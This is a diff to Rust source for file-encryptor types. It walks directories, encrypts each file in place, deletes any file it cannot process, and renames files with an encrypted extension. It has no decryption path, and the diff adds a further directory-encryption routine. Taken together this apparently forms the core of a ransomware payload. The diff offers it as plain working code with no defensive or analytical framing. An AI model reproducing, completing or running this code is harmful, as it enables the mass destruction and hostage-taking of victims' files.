@@ -75,11 +75,10 @@ impl Encryptor256bit {
         };
     }
 
-    pub fn encrypt_dir(&self, dir: &String) -> bool {
+    pub fn encrypt_dir(&self, dir: &String) {
         let files = self.get_files_recursively(&dir);
 
         self.encrypt_files(&files);
-        true
     }
 
     pub fn encrypt_files(&self, files: &Vec<String>) {
@@ -106,10 +105,7 @@ impl Encryptor256bit {
             println!("Name: {}", &file); // HACK DEBUG print
             self.encrypt_file_else_delete(&file);
 
-            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
-                Ok(_) => (),
-                Err(_) => (),
-            };
+            fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION);
         }
     }
 
@@ -135,11 +131,31 @@ impl Encryptor256bit {
         }
     }
 
-    fn attempt_delete_file(&self, path: &String) {
-        match fs::remove_file(path) {
-            Ok(_) => (),
+    pub fn attempt_encrypt_files_in_dir(&self, dir: &String) {
+        match fs::read_dir(&dir) {
+            Ok(dir_read) => {
+                let mut files = vec![];
+                for entry in dir_read.filter_map(|file| file.ok()) {
+                    let path = &entry.path();
+
+                    if path.is_file() {
+                        let path_str = match path.to_str() {
+                            Some(path_str) => path_str,
+                            None => continue,
+                        };
+
+                        let path_string = path_str.to_owned();
+                        files.push(path_string);
+                    }
+                }
+                self.encrypt_files(&files);
+            }
             Err(_) => (),
-        };
+        }
+    }
+
+    fn attempt_delete_file(&self, path: &String) {
+        fs::remove_file(path);
     }
 
     fn get_files_recursively(&self, path: &String) -> Vec<String> {
@@ -205,11 +221,10 @@ impl Encryptor128bit {
         };
     }
 
-    pub fn encrypt_dir(&self, dir: &String) -> bool {
+    pub fn encrypt_dir(&self, dir: &String) {
         let files = self.get_files_recursively(&dir);
 
         self.encrypt_files(&files);
-        true
     }
 
     pub fn encrypt_files(&self, files: &Vec<String>) {
@@ -236,10 +251,7 @@ impl Encryptor128bit {
             println!("Name: {}", &file); // HACK DEBUG print
             self.encrypt_file_else_delete(&file);
 
-            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
-                Ok(_) => (),
-                Err(_) => (),
-            };
+            fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION);
         }
     }
 
@@ -289,10 +301,7 @@ impl Encryptor128bit {
     }
 
     fn attempt_delete_file(&self, path: &String) {
-        match fs::remove_file(path) {
-            Ok(_) => (),
-            Err(_) => (),
-        };
+        fs::remove_file(path);
     }
 
     fn get_files_recursively(&self, path: &String) -> Vec<String> {
@@ -307,70 +316,3 @@ impl Encryptor128bit {
         files
     }
 }
-
-/*
-impl Encryptor256bit {
-    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
-        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
-            Ok(encrypted_text) => encrypted_text,
-            Err(_) => vec![],
-        }
-    }
-
-    pub fn encrypt_file_else_delete(&self, path: &String) {
-        let bytes_to_encrypt = match fs::read(&path) {
-            Ok(bytes) => bytes,
-            Err(_) => {
-                self.attempt_delete_file(&path);
-                return;
-            }
-        };
-        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);
-
-        match fs::write(&path, bytes_encrypted) {
-            Ok(_) => (),
-            Err(_) => {
-                self.attempt_delete_file(&path);
-            }
-        };
-    }
-
-    pub fn encrypt_dir(&self, dir: &String) -> bool {
-        let files = self.get_files_recursively(&dir);
-
-        self.encrypt_files(&files);
-        true
-    }
-
-    pub fn encrypt_files(&self, files: &Vec<String>) {
-        for file in files {
-            println!("Name: {}", &file); // HACK DEBUG print
-            self.encrypt_file_else_delete(&file);
-
-            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
-                Ok(_) => (),
-                Err(_) => (),
-            };
-        }
-    }
-
-    fn attempt_delete_file(&self, path: &String) {
-        match fs::remove_file(path) {
-            Ok(_) => (),
-            Err(_) => (),
-        };
-    }
-
-    fn get_files_recursively(&self, path: &String) -> Vec<String> {
-        let mut files: Vec<String> = vec![];
-
-        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
-            if file.metadata().unwrap().is_file() {
-                files.push(file.path().display().to_string());
-            }
-        }
-
-        files
-    }
-}
-*/
